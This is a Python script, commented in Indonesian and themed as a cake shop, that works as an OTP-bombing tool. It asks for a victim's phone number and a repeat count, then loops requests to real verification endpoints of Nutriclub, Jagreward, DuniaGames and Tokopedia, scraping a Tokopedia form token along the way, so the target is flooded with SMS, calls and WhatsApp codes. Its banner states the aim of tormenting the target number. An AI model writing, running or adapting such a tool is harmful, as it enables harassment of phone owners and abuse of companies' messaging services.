# 🍰 Cake Spam Store — Spam manis kayak kue!
import os, sys, time, requests, json, random, re, threading

# ----------{ Library tambahan untuk warna lucu }---------- #
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    # Fallback kalau belum install
    class Fore:
        CYAN = '\033[96m'; GREEN = '\033[92m'; RED = '\033[91m'
        YELLOW = '\033[93m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'
    Style = type('Style', (), {'RESET_ALL': '\033[0m'})()

C = Fore.CYAN; G = Fore.GREEN; R = Fore.RED
Y = Fore.YELLOW; M = Fore.MAGENTA; W = Fore.WHITE; D = Style.RESET_ALL

# ----------{ bikin animasi gemes }---------- #
def animate_text(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def spin_cake(duration, text):
    # Spinner lucu pake emoji kue
    emojis = ["🧁", "🍰", "🎂", "🍪", "🍩", "🍭", "🍬", "🍫"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{Y}{emojis[i%len(emojis)]} {C}{text}...{D}")
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    print(f"\r{G}🍰 {text} selesai!{D}")

def progress_bakery(total_sec):
    # Progress bar imut
    for i in range(total_sec, 0, -1):
        mins, secs = divmod(i, 60)
        sys.stdout.write(f"\r{Y}⏳ Menunggu {secs:02d} detik lagi ya... {D}")
        sys.stdout.flush()
        time.sleep(1)
    print(f"\r{G}✅ Lanjut!{D}")

# ----------{ Fungsi sukses & gagal }---------- #
def sukses(num, tipe, source):
    print(f"{G}🍰 [{num}] {tipe.upper()} dari {source} TERKIRIM!{D}")

def gagal(num, tipe, source):
    print(f"{R}😿 [{num}] {tipe.upper()} dari {source} GAGAL / LIMIT{D}")

# ----------{ Mesin Spam OTP (dari kode asli, dipertahankan) }---------- #
def spam_nutriclub(no, idx):
    global dark_point
    try:
        resp = requests.post(
            "https://www.nutriclub.co.id/otp/?phone=0"+no+"&old_phone=0"+no,
            headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36'}
        )
        if json.loads(resp.text)["StatusMessage"] == 'Request misscall berhasil':
            sukses(idx, "call", "Nutriclub")
        else:
            gagal(idx, "call", "Nutriclub")
    except:
        gagal(idx, "call", "Nutriclub")

def spam_jagreward(no, idx):
    try:
        resp = requests.get("https://id.jagreward.com/member/verify-mobile/"+no)
        if 'Anda akan menerima sebuah panggilan' in resp.text:
            sukses(idx, "call", "Jagreward")
        else:
            gagal(idx, "call", "Jagreward")
    except:
        gagal(idx, "call", "Jagreward")

def spam_duniagames(no, idx):
    global dark_point
    headers = {
        'Host':'api.duniagames.co.id',
        'content-length':'50',
        'accept':'application/json, text/plain, */*',
        'sec-ch-ua-mobile':'?0',
        'save-data':'on',
        'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
        'content-type':'application/json',
        'origin':'https://duniagames.co.id',
        'sec-fetch-site':'same-site',
        'sec-fetch-mode':'cors',
        'sec-fetch-dest':'empty',
        'referer':'https://duniagames.co.id/',
        'accept-encoding':'gzip, deflate, br',
        'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    data = {
        "phoneNumber": "0"+no,
        "inquiryId": "219424679"
    }
    try:
        resp = requests.post(
            'https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',
            headers=headers, json=data
        ).text
        if 'Field ini harus diisi dengan nomor Telkomsel' in resp:
            print(f"{R}😿 Nomor harus Telkomsel!{D}")
            return 'stop'
        elif 'Maaf, Anda belum melakukan konfirmasi' in resp:
            gagal(idx, "sms", "DuniaGames")
        else:
            sukses(idx, "sms", "DuniaGames")
    except:
        gagal(idx, "sms", "DuniaGames")

def spam_tokopedia(no, idx):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Origin': 'https://accounts.tokopedia.com',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        reg = requests.get(
            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+no+
            '&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
            headers=headers
        ).text
        token = re.search(r'<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', reg).group(1)
        payload = {
            "otp_type": "116",
            "msisdn": "0"+no,
            "tk": token,
            "email": '',
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        resp = requests.post(
            'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
            headers=headers, data=payload
        ).text
        if 'Anda sudah melakukan 3 kali pengiriman' in resp:
            gagal(idx, "wa", "Tokopedia")
        else:
            sukses(idx, "wa", "Tokopedia")
    except:
        gagal(idx, "wa", "Tokopedia")

# ----------{ Banner Cloud Bakery }---------- #
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{C}╔══════════════════════════════════════════════════════╗
║  🍰 {W}CLOUD BAKERY OTP {C}🍰                              ║
║  {Y}Spam manis kayak kue, bikin pusing nomor tujuan!    {C}║
╚══════════════════════════════════════════════════════╝{D}
    """)

def menu():
    print(f"""
{G}🍩 Pilih Menu Kue Spesial :{D}
  {C}[1]{W} 🧁 Spam SMS (DuniaGames) — Telkomsel only
  {C}[2]{W} 📞 Spam Call (Jagreward) — All operator
  {C}[3]{W} 💬 Spam WA (Tokopedia) — All operator
  {C}[4]{W} 🎂 Spam Call (Nutriclub) — All operator
  {C}[0]{R} 🚪 Keluar dari toko kue

{Y}(Pilih angka & tekan ENTER){D}
    """)

def run_spam(pilihan):
    global dark_point
    dark_point = 1
    print(f"\n{G}🍰 Siap memanggang spam...{D}")
    target = input(f"{C}🎯 Masukkan nomor target (contoh: 81234567890): 0{W}")
    jumlah = int(input(f"{C}🔢 Berapa kali spam?: {W}"))
    print(f"\n{Y}🔥 Oven menyala! Mengirim {jumlah}x ke 0{target}...{D}\n")

    stop_flag = False
    for i in range(1, jumlah+1):
        if stop_flag:
            break
        print(f"{M}({i}/{jumlah}){D}", end=" ")
        if pilihan == 1:
            res = spam_duniagames(target, i)
            if res == 'stop':
                stop_flag = True
            else:
                time.sleep(60)
        elif pilihan == 2:
            spam_jagreward(target, i)
            time.sleep(30)
        elif pilihan == 3:
            spam_tokopedia(target, i)
            time.sleep(5)
        elif pilihan == 4:
            spam_nutriclub(target, i)
            time.sleep(30)

    print(f"\n{G}🍰 Semua kue spam sudah matang! Target mungkin kenyang OTP.{D}")
    input(f"{Y}✨ Tekan ENTER untuk kembali ke dapur...{D}")

# ----------{ Loop Utama }---------- #
def main():
    while True:
        banner()
        menu()
        pilih = input(f"{Y}🍭 Pilihanmu: {W}").strip()
        if pilih in ['1','2','3','4']:
            run_spam(int(pilih))
        elif pilih == '0':
            print(f"\n{C}👋 Dadah! Sampai jumpa di Cloud Bakery~ 🍰{D}")
            time.sleep(1)
            sys.exit()
        else:
            print(f"{R}🍩 Hmm, menu itu gak ada. Coba lagi ya.{D}")
            time.sleep(1.5)

if __name__ == "__main__":
    main()